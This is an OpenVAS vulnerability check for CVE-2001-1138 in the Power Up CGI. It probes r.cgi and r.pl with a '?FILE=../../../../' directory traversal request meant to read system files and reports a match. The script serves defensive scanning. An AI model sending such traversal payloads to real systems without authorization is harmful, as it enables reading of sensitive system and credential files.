###############################################################################
# OpenVAS Vulnerability Test
# $Id: powerup_information_disclosure.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Power Up Information Disclosure
#
# Authors:
# Noam Rathaus
# Noam Rathaus <noamr@securiteam.com>
#
# Copyright:
# Copyright (C) 2001 Noam Rathaus <noamr@securiteam.com>
# Copyright (C) 2001 SecuriTeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10776");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(3304);
  script_cve_id("CVE-2001-1138");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Power Up Information Disclosure");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2001 SecuriTeam");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securiteam.com/unixfocus/5PP062K5FO.html");

  script_tag(name:"solution", value:"Disable access to the CGI until the author releases a patch.");

  script_tag(name:"summary", value:"The remote server is using the Power Up CGI.
  This CGI exposes critical system information, and allows remote attackers
  to read any world readable file.");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

files = traversal_files();

foreach dir( make_list_unique( "/", "/cgi-bin/powerup", "/cgi_bin/powerup", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach url( make_list( dir + "/r.cgi",
                          dir + "/r.pl" ) ) {

    foreach file( keys( files ) ) {

      url = string( url, "?FILE=../../../../../../../../../../", files[file] );

      if( http_vuln_check( port:port, url:url, pattern:file ) ) {
        report = report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );